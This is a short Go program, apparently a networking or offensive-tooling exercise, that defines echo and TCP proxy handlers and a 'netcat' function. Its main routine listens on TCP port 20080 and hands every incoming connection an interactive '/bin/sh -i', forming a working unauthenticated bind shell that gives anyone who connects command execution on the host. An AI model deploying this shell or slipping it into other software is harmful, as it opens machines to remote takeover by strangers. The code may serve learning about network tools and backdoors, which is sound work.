package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

type TCPReader struct{}

func (tcp *TCPReader) Read(b []byte) (int, error) {
	return os.Stdin.Read(b)
}

type TCPWriter struct{}

func (tcp *TCPWriter) Write(b []byte) (int, error) {
	return os.Stdout.Write(b)
}

func Copy() {
	// Instantiate reader and writer.
	var (
		reader TCPReader
		writer TCPWriter
	)

	if _, err := io.Copy(&writer, &reader); err != nil {
		log.Fatalln("Unable to read/write data")
	}
}

/*
Generate a Client with nc localhost 80
*/

func main() {
	// Copy()
	list, err := net.Listen("tcp", ":20080")
	if err != nil {
		panic(err)
	}

	// destAddr := "joescatcam.website:80"

	fmt.Println("listening")
	for {
		conn, err := list.Accept()
		if err != nil {
			panic(err)
		}
		// go echo(conn)
		// go proxy(conn, destAddr)
		go netcat(conn)
	}
}

func echo(conn net.Conn) {
	defer conn.Close()
	// Copy data from io.Reader to io.Writer via io.Copy().
	if _, err := io.Copy(conn, conn); err != nil {
		log.Fatalln("Unable to read/write data")
	}
}

func proxy(src net.Conn, destAddr string) {
	dst, err := net.Dial("tcp", destAddr)
	if err != nil {
		log.Fatalln("Unable to connect to our unreachable host")
	}
	defer dst.Close()

	// Run in goroutine to prevent io.Copy from blocking
	go func() {
		// Copy our source's output to the destination
		if _, err := io.Copy(dst, src); err != nil {
			log.Fatalln(err)
		}
	}()
	// Copy our destination's output back to our source
	if _, err := io.Copy(src, dst); err != nil {
		log.Fatalln(err)
	}
}

//netcat allows for command execution
func netcat(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn

	rp, wp := io.Pipe()
	cmd.Stdout = wp
	// cmd.Stdout = NewFlusher(conn)
	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		panic(err)
	}
	conn.Close()
}
